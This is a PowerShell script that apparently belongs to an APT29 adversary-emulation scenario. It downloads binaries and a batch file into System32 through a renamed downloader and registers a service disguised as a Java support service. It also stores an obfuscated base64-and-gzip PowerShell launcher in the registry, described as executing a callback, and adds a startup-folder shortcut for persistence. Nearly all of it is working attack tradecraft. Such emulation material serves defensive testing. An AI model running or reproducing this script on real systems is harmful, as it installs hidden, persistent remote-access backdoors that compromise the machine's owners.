cd \temp
$javamtsupEXEURL = 'https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/apt29/Resources/Scenario_1/SysinternalsSuite/javamtsup.exe?raw=true'
$hostUIEXEURL = 'https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/apt29/Resources/Scenario_1/SysinternalsSuite/strings64.exe?raw=true'
$hostuiBATURL = 'https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/apt29/Resources/Scenario_1/SysinternalsSuite/hostui.txt'

'Downloading files ..' | Out-File -FilePath c:\temp\persistence.txt -Append
rm javamtsup.exe -errorAction SilentlyContinue
rm javamtsup.exe@raw=true -errorAction SilentlyContinue
c:\temp\notepad $javamtsupEXEURL 
rename-item javamtsup.exe@raw=true javamtsup.exe
move-item javamtsup.exe C:\Windows\System32 -force

rm strings64.exe -errorAction SilentlyContinue
rm  strings64.exe@raw=true -errorAction SilentlyContinue
c:\temp\notepad $hostUIEXEURL 
rename-item strings64.exe@raw=true strings64.exe
move-item strings64.exe C:\Windows\System32 -force

rm hostui.txt -errorAction SilentlyContinue
rm hostui.bat -errorAction SilentlyContinue
c:\temp\notepad $hostuiBATURL
rename-item hostui.txt hostui.bat 
move-item hostui.bat C:\Windows\System32\hostui.bat -force

'DOWNLOAD COMPLETED ..' | Out-File -FilePath c:\temp\persistence.txt -Append

'creating service ..' | Out-File -FilePath c:\temp\persistence.txt -Append
try { 
  New-Service -Name "javamtsup" -BinaryPathName "C:\Windows\System32\javamtsup.exe" -DisplayName "Java(TM) Virtual Machine Support Service" -StartupType Automatic -ErrorAction Stop
  
  $javasvc = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnACcASAA0AHMASQBBAE8ASAA4AFUAMQAwAEMAQQA3AFYAVwBlADIALwBhAFMAQgBEAC8AdQA1AEgAeQBIAGEAdwBLAEMAVgB0AEgAdwBFADUASQBTAGkASgBWAE8AaAB0AHMATQBBAEUAQwBHAEoAdABBAGkAcQBxAE4AdgBkAGkAYgByAEIALwBZAGEAeAA3AHAAOQBiAHYAZgBMAEsAKwBtAGEAbABxADEASgA1ADAARgA4AHUANQA0AG4AcgArAFoAbgBkAGwANQBIAHIAbQBNAHgASgBIAHcAOQBHAEkASwBYADAANQBQADMAdgBWAFIAaQBrAEoAQgBMAEcAeAB1AGgAeQBXAGgANABDADYAawBkACsAKwBBAFcAbABnAHUAVgBlAEcAagBJAEQANgBvAFMAZABLAEkAUQAwAFMAaQAyAGMAMQBOAFAAVQA5AFQASABMAEgAZAB2AHQAegBFAFQATQAwAHkASABEADUAUwBnAGoATgBSAEUAdgA0AFIAeABnAEYATwA4AGQAbgBkADQAeABOADIAbQBmAEIARgBLAEgAdwB1AE4AMgBuADgAaQBPAGkAZQBiAFYATgBIAGIAbwBDAEYATQB6AFgAeQArAEwAZABPADcAQwBMAHUAUwBkAGwASwBLAEcARgBpADgAZABPAG4AbwB2AFIAdwBwAHMAegBLACsAaQBKAEgATgBCAE8ATAAxAGkAWgBqAE8AQwB4ADcAbABCAFkAbAA0AGEAdgBFAEQAWQA0ADIAQwBSAGEATABYAGUASwBtAGMAUgBiAFAAVwBYAGwATQBvAG8AdgB6AHMAaAAxAGwAYQBJADUANwBvAEcAMgBKAHUANQBnAEYAcwBaAGMAVgBKAFEAZwBDAGYAaQBsAG0AZQBSAG8ASgBQAEIAdwB1AHYALwBzAHEARgBtAEgAWgBUADIATgBYADkAYgB3AFUAWgAxAG0AeABKAEQAeAB3AHoAUQArAHoAMgBkAC8AaQB3ADkANwBzAE0ASQA4AFkAQwBYAEgAWgBqAEIAaABPADQAOABUAEMANgBaAEsANABPAEMAdQAzAFUATwBSAFIAUABNAFQAegBHAFUAaABaAEwAQwBXAFIAUAA1AE0AawBZAEYAdgBHAHoAMQBnAHMAUgBEAG0AbABKAGUARgBQADEASQBnADkAdgBEAHEAQQA5AHIAdABDADQAbQBzAGgANABPAHEAegBWAEMAcABCAEUAbgA4AE0AcwB4AHQANwBPAGMAVQA3AHcAZQBJAGIAZgB2AEsAOABTAC8ARABzAGMAZwArAG8AZgBUADAAOQBPAFQAMgBaAEgANgBwAGsATQAzAHAAZABKAEwAQgA2ADkANwBCAGQAWQAzAEIATQA3AE0AYwBaADIAWABKADkARgBPAFMAUwAwAEEAVQBiAGkATQBYAHAAQgByAGEARgBVAFoAcABqAGEAWABhAEUAVgBTAGoAawA3AGQATABQAHAAWgBVAEQASwB6AEQARwBzAHYATABaAEEAdABxAEQARQB4AE4AdgBCAGoATAA3AFQAQgBiAG8AawBsAE4ALwBYAG8AOABOAFAAQwBjAFIAYgBtAHcAaQBGAEIATAAzAFUASABMAGkAVwArAGoAaQBPAGMAWABiADgATQBvAEgAdABoADcANABKAEIAYgAzAEgANwBEAFgAdwBCAFQANwBpAEgASABBAGUASgBKAC8ARQBOAE4ARAB3AG8ANgB5AFcAawA2AG8AaAAxAFAAVgBoAFEAeABsADQAQgBVAGsAVAAvAHIAZQBtAFYAMABPAHgASwBJAFoAZABYAEUASQBBAE8AMwAyAFUASABXAEYATwBSAFEANgBQAG4ARAB2AGkAMwB0AHoAcwBNADcAMwB3AEYAUwBzAFUANQBSAGwASgBhAEcAZgB3ADAAbAB6AFMANABLAEYARQBjAFYAZQBTAFYAQwBqAGoATwB3AC8AcQBUAG0ATAB0ADgAdgBpAE4AMwBlADcATwBXAFgARQBSAFIAawA3AHEASgB0AEoATwB4AFQAMwAxAHUAcAB4AGwATABFADAAZAB5AEYAagBFAFAAbgBJAFMAcgBCAEwARQBPAFYAQQBsAEkAUQBXADgAYgBDADIAcwBZAGgALwBzAEYAcAA4AEUANABZADYAbwBoAFQASwBIAHoAUQB0AEkAUQAxAEEANABlAEYAYgBqAE4AZABCAEMAZwA1AEMAegBxAFcAeQBoAFoAawBaAEoAaABTAEgAdwBMAEUAOQA3AGcAWgBGAFAAaAB6AHUAZgBZAGwAdgB5AHcAYgA1ADIAQwB0ACsANwA5ADIAaABnAG4AZgBsAHkAbABFADQAaABQAC8ASwBOADAAaQB0AFIAVwBOAFcARQBoAHkAUwBNAHUAZwBaAEgATgBGAHQAKwBmAHcAWAAyADYAKwBhAEIAWABoAFIAVAAvAEUAKwBBACsATABoAFQARAB4AG8ARwA4AFoAcgB1AFUAQgBRAEwAVQBwADUATABlADQAUgAyAGMAYQBmAE0AbwBqAGQAUwBPAE4AUQBRAHgAbQArAHEAdQA0AGEAZwAvAGkAKwBvAHAAUABHAFoAYgA4AFIAdgA2AGoAdwA2AE0AWgB3ADQARwBpAFcANwBVAHoATgByAHQAZQBtAGwAcwBtAHMAaQBVADQANgBkAGgAQwBZAFIARABGADkAMgBHADkAcwAzAGUAOAB6AE8AYgBrAGQAagBWAHAAdABxADkARgBTADAAOABZADYAbQBLAHQAbQBaAHUAbwB0AGIAVABOAFEATgBOAFYAdABrAFEAOQBPAFcANwBOAHQAawBDAFAAMQB6AHUAQgBwAGIAYQBxAGUARgB2AHIAMwAvAHEAUwArAE0AdgB2AEIAdgBRAG0ARwA2AGgAMwBmADkATwBHAHQAbQBZAEcAcgB5AFYAUABaADEAMgBTAGoAMwByAEcAMABRAEMAZQB5ADYAbAB1AEQAMQBxAEMAcQBUAE0AMQBLAGoAVwByAGsAeABUAEkAdAB0AFQAVQArADIAagB2AGEAMABhAHYAVgAxAHYAMQA2AHAAUABhADYAYgBUAFUAdwA3AGoAeABEAE8AVABlADIAOABzADkAYwBmAHYAcgBjADcARABUADAANwBkADcAbAArADgARQBrADAANABrAE8AZABuAFIAagBNAG4AQQBDAFAASABZAFMAYgBhAHcAYgAwADQARwBUAG0AUAA1AGYASwAzAC8AZwBkAEMAcABWAEkAOQBDAEEAYgBwAEoAMQBKADcARQBxADgAQwBnAEsANABNAEIARwAxAHUAUABsAEIAUgBwAGYASgBvACsAaABJAHcATgBHAFkAOAB1AE0AQQBzAHUAZAAxADAAYwB0AE4AOQBRAHEARgBjAGQAVwBlAGkAYgBCAHgAbQBqADgATABLADkAWAB1AHIAegBlAE8ARAAyAFEAaQBhACsAYwBLAEkAdwA0AHIARwBxAC8ANABsAHkAcABLADcANQBhADMANAAzAE0AdgBEAHUAYQBWAEQAdABQAGEAdAA1AFQATgBRAFMANgBOAE4AQwBsADUAaQBzAGQAOABOAC8ASgBJAHAALwBMAEoALwBkAGsAVwBtAGsAZQA1AFIAcwAxAHYAbABwADYAegArAHYANgA0ADIAZwBnAFQAdwAyADMAYQBvAGQAVABOAHIAaAB3AG4AcQB4ADcAZQA0ADMATwA5AFgAUAB2AHAAVwBkADIAbQA4AHkAZQBqAGgAeQA3ACsAMABKAEQAUwAxAGQAUQA3AHoAegBRAGUAMABaAHQAMAB3AHUAaABiADQAUwAyAGIARAB2AFgAZwB6AHQANwBPAE0ASgBHADkAdwBJADkARABhAHMAVABYAHoATwBKAHkAMwAwADMASgBoAHgAagBXAHkAWgBWAHQAWABIAHIAQgAxAHYARAAyAGcAQgBpAGEANgA5AHIAbgBkAFMAeABxAGgAOABxADEAdwA3AHcAVABoAGQAMQBlAG0AMgBTAHUAYgBGAG8ASwBZAG0ARgBUAEIAVgBLAFIAMgBzAFQAcgBDADAAMAB3AEIAUAA4AFYAbwBiAEoAMQBkAEYAdgAwAEsAbgBhAFMAcwBMADUAZQAxADIAWAA4AHYALwBJAGwAcQBQAFcAaQBzAGoATgBaAG0AdABaAFUAUwBiADMAcQBqAGUAOABOAHQAZQAxAHAAcQBrAEQAUgBDAEMAdgAxAHgAcgAzAC8AawBIAGUANgBsAGYANgBuAHQAcABKAEYAMwBuAGcAYwBKAEsAdAAwAE0AWABBAFMATgByAEUAYQAyAG4AVgBRAEEAUABmAEEARABaADEASwB6AGQASgBqAEQANAA5AHkAcgBWADcAWQBJAGUAMABMACsARgBmAHMAMABuADcALwBCAGwAcwBxAHEAcQAvADkAWABWAE8AMgAzAGwAdwBPAHkAYgBZADMATABMAHoAdQBQAHoAYQB3AE8AZQAxAG0ASQBXAG8AbwAwAEUAOQByAHEAcgBnAGwAOQBlAGUAcgBKAFIAZwBvAFIAcQBVAFkANwBCAGkAcQBEADIAdQBYAE4AcwBmADMALwBQAGoAQwBPAGUAeAA0AEcARwA1AFEAMQA4AGQAdABKACsATgB4AFMANQBLAHMAdwBCAFIATwBJAEEAdwA4AEEANwB0AHoAbwBoAFQAWQB6AC8ARgArAGoASABoAEUAcQBMAEkANwB6AHoAUABPAEkAMAB3AGgAVgBzAEQAMwBDAHMATwBqAFUATwBsAE4ASABiADUAQQBJAFYAeABCADYATgA3AE4AMQBEADUAZgBMAGQAaABlAFgASAArADUAawBvAFMAagBvAHoAUwB0ADcAbAA2AEkATgAzAGMAVABNAEYARgA2AEUAUABiAFoAbABIAHUANABNAGgAbgBRAFUAbABlAFgAOABnAHkAagBFAHAANQBYAFoAVQBoAHkATgArAFAAcQB4ADQAbgBHADMARwBuAHEAOABSAG4ANwBRADYAYQBvADMAcQA2AFYAUwAvAHgATABsAFcAWQB0ADYANAAvAC8ASwArAFkANwBWAHQAagBBAEMALwB2ADEANQBoADkAbwAvADMAaQA2ADIALwBoAEsASgBmADIARQBmADkAQQAvADUANwB3AFIANgBEACsAYQBlAEIAagBSAEIAZwB3AFcAdABEAFkASwBkADUAZABLAGQANgBLAGYAMQA4AGUAcgArADUAYQBQAEMAVwBRACsALwBuACsANABWAGYAbAB1ADUAeQBkADkAZQBBAEsAZABuAHIAeQBMAC8AdwBMAHYAcwAyAFIAQwB3AEEAQQAnACcAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="

  # create new registry key; javasvc.exe reads HKLM:\SOFTWARE\Javasoft and pipes the output to powershell to execute a callback 
  'Creating registry [HKLM:\SOFTWARE\Javasof] ..'  | Out-File -FilePath c:\temp\persistence.txt -Append
  New-Item -ItemType Directory -Force -Path "HKLM:\SOFTWARE\Javasoft" -ErrorAction Stop
  'Setting registry [HKLM:\SOFTWARE\Javasof] Supplement ..'  | Out-File -FilePath c:\temp\persistence.txt -Append
  Set-ItemProperty "HKLM:\SOFTWARE\Javasoft" "value Supplement" $javasvc -ErrorAction Stop
  
  'SERVICE CREATED ..' | Out-File -FilePath c:\temp\persistence.txt -Append
  
} catch {
  
  'creating service - ERROR ..' | Out-File -FilePath c:\temp\persistence.txt -Append

}

'Creating startup link ..' | Out-File -FilePath c:\temp\persistence.txt -Append
 
$Path = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\hostui.lnk"
$TargetPath = "C:\Windows\System32\hostui.bat"
$Icon = "C:\Windows\System32\shell32.dll,255"
[System.IO.FileInfo]$Path = $Path
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($Path)
$Shortcut.TargetPath = $TargetPath
$Shortcut.WindowStyle = 7
$Shortcut.IconLocation = $Icon
$Shortcut.Save() 

'PERSISTENCE done ..' | Out-File -FilePath c:\temp\persistence.txt -Append

get-service -Name javamtsup | Out-File -FilePath c:\temp\persistence.txt -Append

dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"  | Out-File -FilePath c:\temp\persistence.txt -Append



